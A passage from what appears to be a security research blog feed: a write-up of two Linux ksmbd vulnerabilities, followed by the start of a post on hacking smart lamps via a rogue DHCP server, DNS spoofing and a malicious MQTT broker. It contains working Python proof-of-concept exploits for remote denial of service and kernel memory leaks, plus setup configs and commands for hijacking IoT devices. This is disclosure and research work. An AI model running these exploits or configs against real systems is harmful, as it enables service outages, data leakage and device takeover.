GMT</pubDate><content:encoded><![CDATA[<p>December 22nd 2022: it&apos;s Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of <a href="https://www.zerodayinitiative.com/advisories/ZDI-22-1690/" rel="noreferrer"><code>ZDI-22-1690</code></a>, an unauthenticated RCE vulnerability in the Linux kernel&apos;s ksmbd subsystem.</p><p>This vulnerability showed me the way to a buggy subsystem of the Linux kernel: ksmbd. Ksmbd stands for Kernel SMB Daemon which acts as an SMB server (which you may recognize from Windows) in the kernel. SMB is known in the community for the unnecessary complexity and it&apos;s resulting vulnerabilities. Imagine the <a href="https://lwn.net/ml/linux-kernel/202109221850.003A16EC1@keescook/">reaction</a> of the Linux developer community when ksmbd was being introduced in the kernel.</p><p>I wanted to learn more about SMB and the ksmbd subsystem so I decided to do vulnerability research in this subsystem, with results. In this write-up I will present the exploits and technical analyses behind <a href="https://www.zerodayinitiative.com/advisories/ZDI-23-979/"><code>ZDI-23-979</code></a> and <a href="https://www.zerodayinitiative.com/advisories/ZDI-23-980/"><code>ZDI-23-980</code></a>: network-based unauthenticated Denial-of-Service and network-based (un)authenticated Out-of-Bounds read 64KiB.</p><h2 id="an-overview-of-smb">An overview of SMB</h2><p>Server Message Block is a file transfer protocol widely used by Windows OS where it can be used to access a NAS or another computer over a network. The most important features of SMB are file reads and writes, accessing directory information and doing authentication. Since the Windows OS tries to integrate SMB, SMB also has many ways of doing authentication for the Windows ecosystem: NTLMSSP, Kerberos 5, Microsoft Kerberos 5, and Kerberos 5 user-to-user (U2U). Ofcourse, the kernel also supports normal authentication like regular passwords.</p><p>To prevent extensive resource usage (like disk storage and RAM), SMB has a credit system where each command subtracts credits from the session. If the credits reach 0, the session cannot issue more commands.</p><p><strong>N.B. A packet, request and command are different things. The same goes for a session and a connection.</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/01/ksmbd_chained_request.drawio.svg" class="kg-image" alt loading="lazy" width="2203" height="588"><figcaption><span style="white-space: pre-wrap;">An overview of the definitions of an chained SMB request packet.</span></figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/01/ksmbd_session.drawio.svg" class="kg-image" alt loading="lazy" width="1123" height="498"><figcaption><span style="white-space: pre-wrap;">An overview of the definitions of an SMB session and connection.</span></figcaption></figure><h2 id="zdi-23-979-null-pointer-dereference-denial-of-service">ZDI-23-979: NULL Pointer Dereference Denial-of-Service</h2><p>ZDI-23-979 is an network-based unauthenticated NULL pointer dereference vulnerability resulting from a logic bug in the session handling of chained SMB request packets. The ksmbd subsystem only handles the session for the first request in the packet, which makes a second request in the packet use the same session instance as well. However, when the first request does not use a session, the second request does consequently not use a session either, even when it is required. </p><p>This could hypothetically result in an auth bypass since it skips the session/auth checks, but instead leads to an NULL pointer dereference since it tries to access properties of the request session.</p><p>Let&apos;s dive in the function <a href="https://elixir.bootlin.com/linux/v6.3.9/source/fs/ksmbd/server.c#L161"><code>__handle_ksmbd_work</code></a>of <code>v6.3.9</code>, the last vulnerable kernel release. This function gets called for every packet from a connection. As you can see, the function does call <code>__process_request</code> for every request in the packet, but only checks the session for the first request in the packet using <code>conn-&gt;ops-&gt;check_user_session(work)</code> (explanation below).</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void __handle_ksmbd_work(struct ksmbd_work *work,
				struct ksmbd_conn *conn)
{
	u16 command = 0;
	int rc;

	// [snip] (initialize buffers) 

	if (conn-&gt;ops-&gt;check_user_session) {
		rc = conn-&gt;ops-&gt;check_user_session(work);

		// if rc != 0 goto send (auth failed)
		if (rc &lt; 0) {
			command = conn-&gt;ops-&gt;get_cmd_val(work);
			conn-&gt;ops-&gt;set_rsp_status(work,
					STATUS_USER_SESSION_DELETED);
			goto send;
		} else if (rc &gt; 0) {
			rc = conn-&gt;ops-&gt;get_ksmbd_tcon(work);
			if (rc &lt; 0) {
				conn-&gt;ops-&gt;set_rsp_status(work,
					STATUS_NETWORK_NAME_DELETED);
				goto send;
			}
		}
	}

	do {
		rc = __process_request(work, conn, &amp;command);
		if (rc == SERVER_HANDLER_ABORT)
			break;

	    // [snip] (set SMB credits)
	} while (is_chained_smb2_message(work));

	if (work-&gt;send_no_response)
		return;

send:
	// [snip] (send response)
}</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>__handle_ksmbd_work</span></code><span style="white-space: pre-wrap;"> - session handling and request processing per packet.</span></p></figcaption></figure><p>The function <code>conn-&gt;ops-&gt;</code><a href="https://elixir.bootlin.com/linux/v6.3.9/source/fs/ksmbd/smb2pdu.c#L543"><code>check_user_session</code></a><code>(work)</code> checks if the pending request requires a session, and if it does it will check <code>req_hdr-&gt;SessionId</code> for existing sessions whereby <code>req_hdr-&gt;SessionId</code> is randomly generated during SMB login. If the session check succeeds, then <code>work-&gt;sess = ksmbd_session_lookup_all(conn, sess_id)</code> or if the request does not require a session, then <code>work-&gt;sess = NULL</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int smb2_check_user_session(struct ksmbd_work *work)
{
	struct smb2_hdr *req_hdr = smb2_get_msg(work-&gt;request_buf);
	struct ksmbd_conn *conn = work-&gt;conn;
	unsigned int cmd = conn-&gt;ops-&gt;get_cmd_val(work);
	unsigned long long sess_id;

	/*
	 * SMB2_ECHO, SMB2_NEGOTIATE, SMB2_SESSION_SETUP command do not
	 * require a session id, so no need to validate user session&apos;s for
	 * these commands.
	 */
	if (cmd == SMB2_ECHO_HE || cmd == SMB2_NEGOTIATE_HE ||
	    cmd == SMB2_SESSION_SETUP_HE)
		return 0;

	// [snip] (check conn quality)

	sess_id = le64_to_cpu(req_hdr-&gt;SessionId);

	// [snip] (chained request logic that was unused)

	/* Check for validity of user session */
	work-&gt;sess = ksmbd_session_lookup_all(conn, sess_id);
	if (work-&gt;sess)
		return 1;
	
    // [snip] (invalid session handling)
}</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>smb2_check_user_session</span></code><span style="white-space: pre-wrap;"> - codeblock of SMB validation checks.</span></p></figcaption></figure><p>Obviously, when the first command is i.e. <code>SMB2_ECHO_HE</code> and the second command is i.e. <code>SMB2_WRITE</code>, the <code>work-&gt;sess</code> variable will be <code>NULL</code> in <code>smb2_write()</code>. This will cause a dereference like <code>work-&gt;sess-&gt;x</code> and hence a NULL pointer derefence. Since NULL pointer dereferences panic the kernel thread, the SMB server will be taken offline while the rest of the kernel remains online. The proof-of-concept exploit for this vulnerability is as follows:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from impacket import smb3, nmb
from pwn import p64, p32, p16, p8


def main():
    print(&quot;[*] connecting to SMB server (no login)...&quot;)

    try:
        conn = smb3.SMB3(&quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, sess_port=445, timeout=3)
    except nmb.NetBIOSTimeout:
        print(&quot;[!] SMB server is already offline (connection timeout)&quot;)
        return

    # generate innocent SMB_ECHO request
    request_echo = smb3.SMB3Packet()
    request_echo[&apos;Command&apos;] = smb3.SMB2_ECHO
    request_echo[&quot;Data&quot;] = p16(4) + p16(0)
    request_echo[&quot;NextCommand&quot;] = 64+4  # set NextCommand to indicate request chaining

    # generate innocent SMB_WRITE request
    request_write = smb3.SMB3Packet()
    request_write[&apos;Command&apos;] = smb3.SMB2_WRITE
    request_write[&quot;Data&quot;] = p16(49) + p16(0) + p32(0) + p64(0) + p64(0) + p64(0) + p32(0) + p32(0) + p16(0) + p16(0) + p32(0) + p8(0)
    request_write[&quot;TreeID&quot;] = 0

    # chain SMB_WRITE to SMB_ECHO
    request_echo[&quot;Data&quot;] += request_write.getData()

    print(&apos;[*] sending DoS packet...&apos;)
    conn.sendSMB(request_echo)

    print(&quot;[*] probing server health...&quot;)

    try:
        smb3.SMB3(&quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, sess_port=445, timeout=3)
        print(&quot;[!] exploit failed - server remains online&quot;)
    except nmb.NetBIOSTimeout:
        print(&quot;[+] exploit succeeded - server is now offline&quot;)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Proof-of-Concept (PoC) exploit for ZDI-23-979 written in Python code.&#xA0;</span></p></figcaption></figure><p>The most important part of the <a href="https://lore.kernel.org/all/20230626180806.105257976@linuxfoundation.org/">patch</a> is moving the session check into the chained request loop, which results into the session check being executed for each chained request in the packet, instead of just the first one.</p><figure class="kg-card kg-code-card"><pre><code class="language-diff">+++ b/fs/ksmbd/server.c
@@ -184,24 +184,31 @@ static void __handle_ksmbd_work(struct k
 		goto send;
 	}
 
-	if (conn-&gt;ops-&gt;check_user_session) {
-		rc = conn-&gt;ops-&gt;check_user_session(work);
-		if (rc &lt; 0) {
-			command = conn-&gt;ops-&gt;get_cmd_val(work);
-			conn-&gt;ops-&gt;set_rsp_status(work,
-					STATUS_USER_SESSION_DELETED);
-			goto send;
-		} else if (rc &gt; 0) {
-			rc = conn-&gt;ops-&gt;get_ksmbd_tcon(work);
+	do {
+		if (conn-&gt;ops-&gt;check_user_session) {
+			rc = conn-&gt;ops-&gt;check_user_session(work);
 			if (rc &lt; 0) {
-				conn-&gt;ops-&gt;set_rsp_status(work,
-					STATUS_NETWORK_NAME_DELETED);
+				if (rc == -EINVAL)
+					conn-&gt;ops-&gt;set_rsp_status(work,
+						STATUS_INVALID_PARAMETER);
+				else
+					conn-&gt;ops-&gt;set_rsp_status(work,
+						STATUS_USER_SESSION_DELETED);
 				goto send;
+			} else if (rc &gt; 0) {
+				rc = conn-&gt;ops-&gt;get_ksmbd_tcon(work);
+				if (rc &lt; 0) {
+					if (rc == -EINVAL)
+						conn-&gt;ops-&gt;set_rsp_status(work,
+							STATUS_INVALID_PARAMETER);
+					else
+						conn-&gt;ops-&gt;set_rsp_status(work,
+							STATUS_NETWORK_NAME_DELETED);
+					goto send;
+				}
 			}
 		}
-	}
 
-	do {
 		rc = __process_request(work, conn, &amp;command);
 		if (rc == SERVER_HANDLER_ABORT)
 			break;
--- a/fs/ksmbd/smb2pdu.c</code></pre><figcaption><p><span style="white-space: pre-wrap;">The official patch for </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ZDI-23-979</span></code><span style="white-space: pre-wrap;">.</span></p></figcaption></figure><h2 id="zdi-23-980-out-of-bounds-read-information-disclosure">ZDI-23-980: Out-Of-Bounds Read Information Disclosure</h2><p>ZDI-23-980 is a network-based (un)authenticated out-of-bounds read in the ksmbd subsystem of the Linux kernel, which allows a user to read up to 65536 consequent bytes from kernel memory. This issue results from an buffer over-read, much like the Heartbleed vulnerability in SSL, where the request packet states that the packet content is larger than it&apos;s actual size, resulting in the parsing of the packet with a fake size. </p><p>This can be exploited by issueing an SMB_WRITE request with size N to file &quot;dump.bin&quot;, whereby the actual request empty is smaller than N. Then, issue an SMB_READ request to download the &quot;dump.bin&quot; file and eventually delete &quot;dump.bin&quot; to remove the exploitation traces.</p><p>When I was researching this vulnerability, I also found an unauthenticated OOB read of 2 bytes using SMB_ECHO, but I figured this was less important than the authenticated OOB read of 65536 bytes due to usability (whether or not this was the right decision is up to debate ;-) ). Hence, the CVE description says it&apos;s authenticated. I will also discuss the SMB_ECHO and explain the exploitation behind that path. The 2-byte OOB read consists of issue&apos;ing an SMB_ECHO command with the last 2 bytes of the packet not being filled in. </p><h3 id="the-underlying-issue">The underlying issue</h3><p>The underlying issue leading to the OOB read is improper validation of the SMB request packet parameter <code>smb2_hdr.NextCommand</code> containing the offset to the next command. When <code>NextCommand</code> is set, the SMB server assumes that the current command/request is the size of <code>NextCommand</code>. Hence, when I have a packet of size N, I can set <code>NextCommand</code> to N+2, and it will assume the packet is N+2 bytes long. This can be seen in action in the <code>ksmbd_smb2_check_message</code> and <code>smb2_calc_size</code> functions. The function <code>ksmbd_smb2_check_message</code> does several assertions/validations:</p><figure class="kg-card kg-code-card"><pre><code class="language-C">hdr-&gt;StructureSize == 64
pdu-&gt;StructureSize2 == smb2_req_struct_sizes[command]  // SMB2_WRITE: 49, SMB2_ECHO: 4
hdr-&gt;NextCommand == pdu-&gt;StructureSize2 + hdr-&gt;StructureSize  // SMB_ECHO
hdr-&gt;NextCommand == hdr-&gt;DataOffset + hdr-&gt;Length  // SMB_WRITE</code></pre><figcaption><p><span style="white-space: pre-wrap;">The assertions put onto the packet, for validation.</span></p></figcaption></figure><p>But it does not assert <code>work-&gt;next_smb2_rcv_hdr_off + hdr-&gt;NextCommand &lt;= get_rfc1002_len(work-&gt;request_buf)</code>, which is the official patch.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static int smb2_get_data_area_len(unsigned int *off, unsigned int *len,
				  struct smb2_hdr *hdr)
{
	int ret = 0;

	*off = 0;
	*len = 0;

	switch (hdr-&gt;Command) {
	// [snip] not reached
	case SMB2_WRITE:
		if (((struct smb2_write_req *)hdr)-&gt;DataOffset ||
		    ((struct smb2_write_req *)hdr)-&gt;Length) {
			*off = max_t(unsigned int,
				     le16_to_cpu(((struct smb2_write_req *)hdr)-&gt;DataOffset),
				     offsetof(struct smb2_write_req, Buffer));
			*len = le32_to_cpu(((struct smb2_write_req *)hdr)-&gt;Length);
			break;
		}

		*off = le16_to_cpu(((struct smb2_write_req *)hdr)-&gt;WriteChannelInfoOffset);
		*len = le16_to_cpu(((struct smb2_write_req *)hdr)-&gt;WriteChannelInfoLength);
		break;
	// [snip] not reached
	default:
		// [snip] not reached
	}

	// [snip] return error if offset &gt; 4096

	return ret;
}

static int smb2_calc_size(void *buf, unsigned int *len)
{
	struct smb2_pdu *pdu = (struct smb2_pdu *)buf;
	struct smb2_hdr *hdr = &amp;pdu-&gt;hdr;
	unsigned int offset; /* the offset from the beginning of SMB to data area */
	unsigned int data_length; /* the length of the variable length data area */
	int ret;

	*len = le16_to_cpu(hdr-&gt;StructureSize);
	*len += le16_to_cpu(pdu-&gt;StructureSize2);

	if (has_smb2_data_area[le16_to_cpu(hdr-&gt;Command)] == false) {
		// SMB_ECHO will reach this
        goto calc_size_exit;
	}

	// SMB_WRITE will reach this
	ret = smb2_get_data_area_len(&amp;offset, &amp;data_length, hdr);
    // [snip] return error if ret &lt; 0

	if (data_length &gt; 0) {
		// [snip] return error when data overlaps with next cmd

		*len = offset + data_length;
	}

calc_size_exit:
	ksmbd_debug(SMB, &quot;SMB2 len %u\n&quot;, *len);
	return 0;
}

int ksmbd_smb2_check_message(struct ksmbd_work *work)
{
	struct smb2_pdu *pdu = ksmbd_req_buf_next(work);
	struct smb2_hdr *hdr = &amp;pdu-&gt;hdr;
	int command;
	__u32 clc_len;  /* calculated length */
	__u32 len = get_rfc1002_len(work-&gt;request_buf);

	if (le32_to_cpu(hdr-&gt;NextCommand) &gt; 0)
		len = le32_to_cpu(hdr-&gt;NextCommand);
	else if (work-&gt;next_smb2_rcv_hdr_off)
		len -= work-&gt;next_smb2_rcv_hdr_off;

	// [snip] check flag in header

	if (hdr-&gt;StructureSize != SMB2_HEADER_STRUCTURE_SIZE) {
		// [snip] return error
	}

	command = le16_to_cpu(hdr-&gt;Command);
	// [snip] check if command is valid

	if (smb2_req_struct_sizes[command] != pdu-&gt;StructureSize2) {
		// [snip] return error (with exceptions)
	}

	if (smb2_calc_size(hdr, &amp;clc_len)) {
		// [snip] return error (with exceptions)
	}

	if (len != clc_len) {
		// [snip] return error (with exceptions)
	}

validate_credit:
	// [snip] irrelevant credit check

	return 0;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">The functions causing the vulnerability.</span></p></figcaption></figure><p>As you can see, for SMB_WRITE we can set an arbitrary packet size by setting  <code>hdr-&gt;Length</code> and <code>hdr-&gt;NextCommand</code> variables to compliment each other. As per SMB_ECHO, we just need to set <code>hdr-&gt;NextCommand</code> to the expected value, without actually filling in <code>smb2_echo_req-&gt;reserved</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">struct smb2_echo_req {
	struct smb2_hdr hdr;
	__le16 StructureSize;	/* Must be 4 */
	__u16  Reserved;
} __packed;</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>smb2_echo_req</span></code><span style="white-space: pre-wrap;"> struct.</span></p></figcaption></figure><h3 id="exploitation">Exploitation</h3><p>To leak 2 bytes using <code>SMB_ECHO</code>:</p><ol><li>Set <code>smb2_echo_req-&gt;StructureSize = p16(4)</code></li><li>Set <code>smb2_echo_req-&gt;hdr.NextCommand = sizeof(smb2_echo_req-&gt;hdr) + smb2_echo_req-&gt;StructureSize</code></li><li>Send request</li><li>Read echo response, with the last 2 bytes being an OOB read.</li></ol><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from impacket import smb3
from pwn import p64, p32, p16, p8


def main():
    print(&quot;[*] connecting to SMB server...&quot;)
    conn = smb3.SMB3(&quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, sess_port=445)

    packet = smb3.SMB3Packet()
    packet[&apos;Command&apos;] = smb3.SMB2_ECHO
    packet[&quot;Data&quot;] = p16(0x4)
    packet[&quot;NextCommand&quot;] = 64+4

    print(&quot;[*] sending OOB read...&quot;)
    conn.sendSMB(packet)

    print(&quot;[*] reading response...&quot;)
    rsp = conn.recvSMB().rawData
    print(rsp)


if __name__ == &quot;__main__&quot;:
    main()</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>ZDI-23-980</span></code><span style="white-space: pre-wrap;"> PoC exploit using </span><code spellcheck="false" style="white-space: pre-wrap;"><span>SMB_ECHO</span></code></p></figcaption></figure><p>For the <code>SMB_WRITE</code> path, here&apos;s the struct and the steps:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">struct smb2_write_req {
	struct smb2_hdr hdr;
	__le16 StructureSize; /* Must be 49 */
	__le16 DataOffset; /* offset from start of SMB2 header to write data */
	__le32 Length;
	__le64 Offset;
	__u64  PersistentFileId; /* opaque endianness */
	__u64  VolatileFileId; /* opaque endianness */
	__le32 Channel; /* MBZ unless SMB3.02 or later */
	__le32 RemainingBytes;
	__le16 WriteChannelInfoOffset;
	__le16 WriteChannelInfoLength;
	__le32 Flags;
	__u8   Buffer[];
} __packed;</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>smb2_write_req</span></code><span style="white-space: pre-wrap;"> struct.</span></p></figcaption></figure><ol><li>Set <code>smb2_write_req-&gt;StructureSize = 49</code></li><li>Set <code>smb2_write_req-&gt;DataOffset = smb2_write_req-&gt;StructureSize + 64</code> to start reading the content without the packet</li><li>Set <code>smb2_write_req-&gt;Length = 65536</code> to write 65536 bytes from the packet to the file</li><li>Set <code>smb2_write_req-&gt;hdr.NextCommand = smb2_write_req-&gt;Length  + smb2_write_req-&gt;DataOffset</code> to spoof the request size</li><li>Open a file in the SMB share in read/write mode: <code>file_id = smb_open(&quot;dump.bin&quot;, &quot;rw&quot;)</code></li><li>Set <code>smb2_write_req-&gt;PersistentFileId = file_id</code></li><li>Send the request</li><li>Read the file in the SMB share: <code>dump = smb_read(file_id)</code></li></ol><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from impacket import smb3
from pwn import p64, p32, p16, p8


def main(username: str, password: str, share: str, filename: str):
    print(&quot;[*] connecting to SMB server...&quot;)
    conn = smb3.SMB3(&quot;127.0.0.1&quot;, &quot;127.0.0.1&quot;, sess_port=445)

    print(f&quot;[*] logging into SMB server in (username: &apos;{username}&apos;, password: &apos;{password}&apos;)...&quot;)
    conn.login(user=username, password=password)

    print(f&quot;[*] connecting to tree/share: &apos;{share}&apos;&quot;)
    tree_id = conn.connectTree(share)

    packet = smb3.SMB3Packet()
    packet[&apos;Command&apos;] = smb3.SMB2_WRITE

    StructureSize = 49
    DataOffset = 64 + StructureSize  # fixed packet size excl buffer
    Length = 0x10000  # max credits: 8096, so max buffer: 8096*8 (0x10000), but max IO size: 4*1024*1024 (0x400000)

    # this is ugly but acquires a RW handle for the &apos;{filename}&apos; file containing the memory
    file_id = conn.create(tree_id, filename, desiredAccess=smb3.FILE_READ_DATA|smb3.FILE_SHARE_WRITE, creationDisposition=smb3.FILE_OPEN|smb3.FILE_CREATE,
                            creationOptions=smb3.FILE_NON_DIRECTORY_FILE, fileAttributes=smb3.FILE_ATTRIBUTE_NORMAL, shareMode=smb3.FILE_SHARE_READ|smb3.FILE_SHARE_WRITE)

    packet[&quot;Data&quot;] = (p16(StructureSize) + p16(DataOffset) + p32(Length) + p64(0) + file_id[:8] + p64(0) + p32(0) + p32(0) + p16(0) + p16(0) + p32(0) + p8(0))
    packet[&quot;TreeID&quot;] = tree_id
    packet[&quot;NextCommand&quot;] = DataOffset+Length  # the end of the buffer is past the end of the packet

    print(f&quot;[*] sending OOB read for 65536 bytes... (writing to file &apos;{filename}&apos;)&quot;)
    conn.sendSMB(packet)

    print(&quot;[*] closing file descriptors...&quot;)
    conn.close(tree_id, file_id)  # close fd&apos;s bcs impacket is impacket

    print(f&quot;[*] reading file containing kernel memory: &apos;{filename}&apos;&quot;)
    conn.retrieveFile(share, filename, print)  # print file (containing kmem dump)


if __name__ == &quot;__main__&quot;:
    main(&quot;user&quot;, &quot;pass&quot;, &quot;files&quot;, &quot;dump.bin&quot;)</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>ZDI-23-980</span></code><span style="white-space: pre-wrap;"> PoC exploit using </span><code spellcheck="false" style="white-space: pre-wrap;"><span>SMB_WRITE</span></code></p></figcaption></figure><h2 id="conclusion">Conclusion</h2><p>Thank you for reading my write-up on this Linux kernel vulnerability. I hope you learned about the ksmbd kernel subsystem and that you like the write-up style.</p><p>For questions, job inquiries, and other things, please send an email to <a href="mailto:notselwyn@pwning.tech" rel="noreferrer">notselwyn@pwning.tech</a> (<a href="https://pwning.tech/pgp-notselwyn-pwning-tech-DE800B06B04C6635.asc" rel="noreferrer">PGP key</a>).</p>]]></content:encoded></item><item><title><![CDATA[How I hacked smart lights: the story behind CVE-2022-47758]]></title><description><![CDATA[<h2 id="introduction">Introduction</h2><p>In this blogpost, we take a closer look at our research regarding CVE-2022-47758: a critical vulnerability impacting a very large number of Internet of Things smart devices. We could leverage this vulnerability in the lamp&apos;s firmware for unauthenticated remote code execution on the entire device with the</p>]]></description><link>https://pwning.tech/cve-2022-47758/</link><guid isPermaLink="false">658f44f8d32e980001de21ef</guid><category><![CDATA[Infrastructure]]></category><category><![CDATA[Real World]]></category><category><![CDATA[x64 Assembly]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Wed, 08 Mar 2023 07:30:00 GMT</pubDate><content:encoded><![CDATA[<h2 id="introduction">Introduction</h2><p>In this blogpost, we take a closer look at our research regarding CVE-2022-47758: a critical vulnerability impacting a very large number of Internet of Things smart devices. We could leverage this vulnerability in the lamp&apos;s firmware for unauthenticated remote code execution on the entire device with the highest privileges and hence abuse it for information gathering (and for haunting someone in their own house). Additionally, we could pivot to the management devices using a <a href="https://pwning.tech/cve-2022-46640">vulnerability in the smart lamps&apos; desktop management software</a> (CVE-2022-46640). To make matters more interesting: the vulnerable traffic flowed through an encrypted outbound connection which means that it typically isn&apos;t blocked by a firewall. This blogpost serves as a cautionary tale for both vendors and consumers, highlighting the importance of IoT security. Join us as we dive into the technical details and lessons learned from our research.</p><h2 id="proof-of-concept-exploit">Proof of Concept exploit</h2><p>The goal of our proof of concept (PoC) exploit is proving that we can remotely execute code on our own smart lamps. For the PoC exploit we&apos;re redirecting local traffic to the vendors MQTT(S) broker to our own machine via malicious DNS records. In practice, an attacker could perform this redirect by committing either a rogue DHCP server attack, hacking a router, hacking a DNS server, et cetera. Once we have control over the MQTT traffic, we send a debugging command to a debugging endpoint on our smart lamp. Finally, we activate a persistent OpenSSH server in order to easily access the lamp.</p><h3 id="methodology">Methodology</h3><p>We use the following methodology in this blogpost:</p><ul><li>*.acme.org - the<strong> </strong>vendor domain names</li><li>mqtt.acme.org - the vendor MQTT broker domain name</li><li>192.168.128.0/24 - our controlled network environment</li><li>192.168.128.10 - our attacker machine</li><li>192.168.128.20 - our vulnerability smart device</li></ul><h3 id="spoofing-dns">Spoofing DNS</h3><p>In order to spoof DNS we need to set up a rogue DHCP server. The Dynamic Host Configuration Protocol (DHCP) is primarily used by network administrators to set the private ip addreses of devices on the network dynamically. However, DHCP packets also have a few more interesting parameters: domain name servers IP addresses, hostnames, and even gateway IP addresses. In order to MitM MQTT traffic to <code>mqtt.acme.org</code>, we are setting the domain name of the smart lamp by creating a malicious DHCP offer - using our rogue DHCP server - which sets the domain name server to <code>192.168.128.10</code>. </p><p>By installing <code>isc-dhcp-server</code> on our Linux install and configuring it to run maliciously on our local network environment (<code>192.168.128.0/24</code>). We want to make the smart lamp use our own DNS resolver over at <code>192.168.128.10</code>.  The configuration we use is as following:</p><figure class="kg-card kg-code-card"><pre><code class="language-conf">subnet 192.168.128.0 netmask 255.255.255.0 {
    range                           192.168.128.10 192.168.128.254;
    option broadcast-address        192.168.128.255;
    option routers                  192.168.128.1;
    option subnet-mask              255.255.255.0;
    option domain-name-servers      192.168.128.10;  # set DNS resolver

    host router {
        hardware ethernet &lt;mac_router&gt;;
        fixed-address 192.168.128.1;
    }

    host attacker {
        hardware ethernet &lt;mac_attacker&gt;;
        fixed-address 192.168.128.10;
    }

    host lamp {
        hardware ethernet &lt;mac_lamp&gt;;
        fixed-address 192.168.128.20;
    }
}</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/dhcp/dhcpd.conf</span></code><span style="white-space: pre-wrap;"> - setup DHCP server to spoof DNS and spoof DNS</span></p></figcaption></figure><p>In order to change the IP address to which <code>mqtt.acme.org</code> points, we need to setup our own DNS resolver by installing <code>bind9</code> and setting a custom DNS record for the zone<code>mqtt.acme.org</code> which points to our own MQTT broker:</p><figure class="kg-card kg-code-card"><pre><code class="language-conf">;
; BIND data file for local loopback interface
;
$TTL	604800
@	IN	SOA	mqtt.acme. root.mqtt.acme.org. (
			      2		; Serial
			 604800		; Refresh
			  86400		; Retry
			2419200		; Expire
			 604800 )	; Negative Cache TTL

;
@	IN	NS	ns.mqtt.acme.org.
ns	IN	A	192.168.128.10
@	IN	A	192.168.128.10</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/bind/named.conf.local</span></code><span style="white-space: pre-wrap;"> - malicious DNS record (redirects traffic to our malicious IP)</span></p></figcaption></figure><h3 id="setting-up-a-malicious-mqtt-broker">Setting up a malicious MQTT broker</h3><p>Since our traffic to <code>mqtt.acme.org</code> now points to our own IP address (<code>192.168.128.10</code>), we can eavesdrop the traffic. However, in order to interact with this traffic, we need to set an MQTT broker up on <code>192.168.128.10</code>. We do this so we can publish to a custom debugging MQTT channel devoted to debugging (custom made by Acme). By publishing on this MQTT channel, we can execute commands. It&apos;s important that the server listens on port 443, has TLS encryption and allows anonymous logins. Hence, if the smart lamp tries to connect to <code>mqtts://nobody@mqtt.acme.org:443</code> it should succeed. We configured it by using the following configuration:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash"># Place your local configuration in /etc/mosquitto/conf.d/
#
# A full description of the configuration file is at
# /usr/share/doc/mosquitto/examples/mosquitto.conf.example

listener 443
cafile /etc/mosquitto/ca_certificates/ca.crt
keyfile /etc/mosquitto/certs/server.key
certfile /etc/mosquitto/certs/server.crt
tls_version tlsv1.2
allow_anonymous true
protocol mqtt

persistence true
persistence_location /var/lib/mosquitto/
log_dest file /var/log/mosquitto/mosquitto.log

include_dir /etc/mosquitto/conf.d</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/mosquitto/mosquitto.conf</span></code><span style="white-space: pre-wrap;"> - malicious MQTT(S) broker to allows all logins</span></p></figcaption></figure><p>As you might have noticed, we are dealing with MQTT<strong>S</strong>. Like HTTPS, the S in MQTTS stands for Secure. In order to make such a protocol secure, we need to create TLS certifications so we can encrypt the MQTT trafifc coming from our own MQTT broker. We can create such TLS certifications by running the following command: </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ openssl genrsa -des3 -out /etc/mosquitto/ca_certificates/ca.key 2048
$ openssl req -new -x509 -days 1826 -key /etc/mosquitto/ca_certificates/ca.key -out /etc/mosquitto/certs/ca.crt
$ openssl genrsa -out /etc/mosquitto/certs/server.key 2048</code></pre><figcaption><p><span style="white-space: pre-wrap;">Creating TLS keys/certificates using OpenSSL</span></p></figcaption></figure><h3 id="performing-the-exploit">Performing the exploit</h3><p>Now we have our infrastructure set up, we need to reboot the lamp such that it will trigger a DHCP discover request as part of the Discover Offer Request Accept (DORA) sequence. The next part of the DORA sequence would be &apos;Offer&apos;, where the server offers a new IP address (and our domain name server IP address) to our smart lamp. That offer will set the lamps DNS records of <code>mqtt.acme.org</code> to <code>192.168.128.10</code>. </p><p>We can confirm that the vulnerable smart lamp is using our own MQTT broker by inspecting the local traffic using Wireshark on <code>192.168.128.10</code>. After the victim device has connected to our server, we want to activate an OpenSSH server. In order to do this, we create the <code>/acme/ssh_enabled</code> file which enables persistent SSH access after the device reboots. We could probably do it without rebooting, be it would be a lot more unnecessary effort. After that, we stop the debugging of the touch command, and instead debug <code>passwd -d root</code> which deletes the password for the root user. This is convenient, because the default password is unknown and this way we can set the password without a TTY. Additionally the SSH server allows passwordless logins. In order to pull it off, we execute the following commands using <code>mosquitto_pub</code> (publishes messages to the Mosquitto broker):</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/touch /acme/ssh_enabled&quot; --insecure --cafile 